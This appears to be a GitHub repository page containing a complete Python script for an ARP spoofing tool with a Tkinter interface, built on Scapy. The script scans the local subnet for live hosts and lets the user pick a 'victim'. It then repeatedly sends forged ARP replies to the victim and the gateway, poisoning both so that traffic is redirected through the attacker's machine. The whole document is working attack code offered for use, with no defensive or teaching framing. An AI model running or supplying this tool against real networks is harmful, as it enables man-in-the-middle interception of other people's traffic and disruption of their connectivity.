# lalitkumarthapa-ARP-
arp spoofing code
#!/usr/bin/env python3
# © FlalitkKumar Thapa

import os
import time
import threading
import tkinter as tk
from tkinter import messagebox
from scapy.all import ARP, Ether, sendp, srp, conf, get_if_addr, get_if_hwaddr

# Global variables
stop_event = threading.Event()
hosts = []
attacker_ip = ""
attacker_mac = ""
gateway_ip = ""
gateway_mac = ""
iface = conf.iface

def get_gateway_ip():
    with os.popen("ip route | grep default") as f:
        return f.read().split()[2]

def getmac(ip):
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    ans, _ = srp(pkt, timeout=2, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    else:
        return None

def arp_scan(subnet):
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet)
    ans, _ = srp(pkt, timeout=2, verbose=False)
    live_hosts = []
    for snd, rcv in ans:
        live_hosts.append((rcv.psrc, rcv.hwsrc))
    return live_hosts

def spoof(victim_ip, victim_mac, spoof_ip, attacker_mac, iface):
    while not stop_event.is_set():
        pkt1 = Ether(dst=victim_mac, src=attacker_mac) / ARP(
            op=2, psrc=spoof_ip, pdst=victim_ip, hwdst=victim_mac, hwsrc=attacker_mac
        )
        pkt2 = Ether(dst=gateway_mac, src=attacker_mac) / ARP(
            op=2, psrc=victim_ip, pdst=gateway_ip, hwdst=gateway_mac, hwsrc=attacker_mac
        )
        sendp(pkt1, iface=iface, verbose=False)
        sendp(pkt2, iface=iface, verbose=False)
        time.sleep(2)

def start_spoofing():
    global stop_event
    try:
        index = victim_listbox.curselection()[0]
    except IndexError:
        messagebox.showerror("Error", "Please select a victim.")
        return

    victim_ip, victim_mac = hosts[index]
    status_label.config(text=f"🔴 Spoofing {victim_ip}")
    stop_event.clear()
    t = threading.Thread(target=spoof, args=(victim_ip, victim_mac, gateway_ip, attacker_mac, iface))
    t.daemon = True
    t.start()

def stop_spoofing():
    global stop_event
    stop_event.set()
    status_label.config(text="🟢 Spoofing stopped")

def scan_hosts():
    global hosts, attacker_ip, attacker_mac, gateway_ip, gateway_mac
    status_label.config(text="🟡 Scanning network...")
    victim_listbox.delete(0, tk.END)

    attacker_ip = get_if_addr(iface)
    attacker_mac = get_if_hwaddr(iface)
    gateway_ip = get_gateway_ip()
    gateway_mac = getmac(gateway_ip)

    subnet = attacker_ip.rsplit('.', 1)[0] + '.0/24'
    hosts = arp_scan(subnet)

    if not hosts:
        victim_listbox.insert(tk.END, "No live hosts found.")
        return

    for ip, mac in hosts:
        victim_listbox.insert(tk.END, f"{ip} - {mac}")
    
    status_label.config(text="🟢 Scan complete")

# GUI Setup
root = tk.Tk()
root.title("ARP Spoofer - © FlalitkKumar Thapa")
root.geometry("500x430")
root.resizable(False, False)

tk.Label(root, text="ARP Spoofer Tool", font=("Helvetica", 16, "bold")).pack(pady=10)

tk.Button(root, text="🔍 Scan Network", command=scan_hosts, bg="#337ab7", fg="white", width=25).pack(pady=5)

victim_listbox = tk.Listbox(root, width=60, height=10)
victim_listbox.pack(pady=10)

tk.Button(root, text="▶ Start Spoofing", command=start_spoofing, bg="#5cb85c", fg="white", width=25).pack(pady=5)
tk.Button(root, text="⏹ Stop Spoofing", command=stop_spoofing, bg="#d9534f", fg="white", width=25).pack(pady=5)

status_label = tk.Label(root, text="🔵 Idle", font=("Arial", 11))
status_label.pack(pady=20)

tk.Label(root, text="© FlalitkKumar Thapa", font=("Arial", 9)).pack(side="bottom", pady=5)

root.mainloop()
